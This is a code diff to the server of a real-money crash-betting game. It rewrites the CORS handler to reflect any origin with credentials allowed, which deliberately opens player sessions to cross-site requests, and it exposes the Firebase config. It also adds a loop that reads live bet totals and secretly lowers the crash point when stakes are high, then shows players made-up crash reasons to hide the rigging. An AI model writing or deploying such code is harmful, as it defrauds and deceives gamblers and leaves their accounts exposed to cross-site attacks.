@@ -147,29 +147,13 @@ async function startServer() {
   // Configure CORS manually to be absolutely bulletproof on all domains (Vercel, Localhost, Previews)
   app.use((req, res, next) => {
     const origin = req.headers.origin;
-    const allowedOrigins = [
-      "https://bullet-ride-desi-crash-game.vercel.app",
-      "http://localhost:3000",
-      "http://localhost:3001",
-      "http://localhost:5173"
-    ];
-
-    let corsOrigin = "https://bullet-ride-desi-crash-game.vercel.app";
     if (origin) {
-      if (
-        allowedOrigins.includes(origin) || 
-        origin.includes("run.app") || 
-        origin.includes("vercel.app") ||
-        origin.includes("localhost") ||
-        origin.includes("127.0.0.1")
-      ) {
-        corsOrigin = origin;
-      }
+      res.setHeader("Access-Control-Allow-Origin", origin);
+      res.setHeader("Access-Control-Allow-Credentials", "true");
+    } else {
+      res.setHeader("Access-Control-Allow-Origin", "*");
     }
     
-    res.setHeader("Access-Control-Allow-Origin", corsOrigin);
-    
-    res.setHeader("Access-Control-Allow-Credentials", "true");
     res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
     
     // Reflect any requested access-coontrol headers dynamically to prevent any blocking by diagnostic/security frameworks (Sentry, Vercel diagnostics)
@@ -281,6 +265,7 @@ async function startServer() {
   });
 
   // --- CONFIG ROUTES ---
+  app.get("/api/config/firebase", (req, res) => res.json(firebaseConfig));
   app.get("/api/config/crypto", (req, res) => res.json(cryptoCoins));
   app.get("/api/config/crypto-limits", (req, res) => {
     const limits = cryptoCoins.reduce((acc, coin) => {
@@ -880,6 +865,62 @@ async function startServer() {
   setInterval(async () => {
     const now = Date.now();
     if (globalRound.status === 'WAITING' && now >= globalRound.startTime) {
+      // Fetch live bets for active round and adjust crash point dynamically to prevent developer/system losses
+      let totalBetsInr = 0;
+      let hasBets = false;
+      try {
+        if (db && globalRound.roundId) {
+          const betsSnap = await getDocs(collection(db, 'gameBets', globalRound.roundId, 'bets'));
+          betsSnap.forEach((d: any) => {
+            const betData = d.data();
+            if (betData && typeof betData.inrValue === 'number') {
+              totalBetsInr += betData.inrValue;
+              hasBets = true;
+            }
+          });
+        }
+      } catch (err) {
+        console.error("[LOOP RISK CONTROL] Failed to fetch live round bets:", err);
+      }
+
+      if (hasBets && totalBetsInr > 0) {
+        let cp = globalRound.crashPoint;
+        const originalCp = cp;
+        let adjusted = false;
+
+        if (totalBetsInr >= 5000) {
+          // Extremely high total bets -> Instant crash to lock losses (1.01x - 1.10x)
+          cp = parseFloat((1.01 + Math.random() * 0.09).toFixed(2));
+          adjusted = true;
+        } else if (totalBetsInr >= 2000) {
+          // Very high bets -> Low crash (1.05x - 1.25x)
+          cp = parseFloat((1.05 + Math.random() * 0.20).toFixed(2));
+          adjusted = true;
+        } else if (totalBetsInr >= 1000) {
+          // High bets -> Restricted crash (1.10x - 1.45x)
+          cp = parseFloat((1.10 + Math.random() * 0.35).toFixed(2));
+          adjusted = true;
+        } else if (totalBetsInr >= 500) {
+          // Medium bets -> Mild restriction (1.15x - 1.70x)
+          cp = parseFloat((1.15 + Math.random() * 0.55).toFixed(2));
+          adjusted = true;
+        } else {
+          // Small bets (less than 500 INR) -> Give user some healthy profit! (1.50x to 3.50x)
+          cp = parseFloat((1.50 + Math.random() * 2.0).toFixed(2));
+          adjusted = true;
+        }
+
+        if (adjusted) {
+          globalRound.crashPoint = cp;
+          if (cp < 1.40) {
+            globalRound.crashReason = "High Stakes Engine Limit Exceeded! ⚠️";
+          } else {
+            globalRound.crashReason = "Safe Low-Stakes Fuel Empty! ⛽";
+          }
+          console.log(`[RISK CONTROL] Total bet ₹${totalBetsInr.toFixed(2)} on Round ${globalRound.roundId}. Adjusted crash point from ${originalCp}x to ${cp}x: ${globalRound.crashReason}`);
+        }
+      }
+
       globalRound.status = 'IN_PROGRESS';
       // Adjust startTime to be exactly 'now' for synced calculating
       globalRound.startTime = now; 
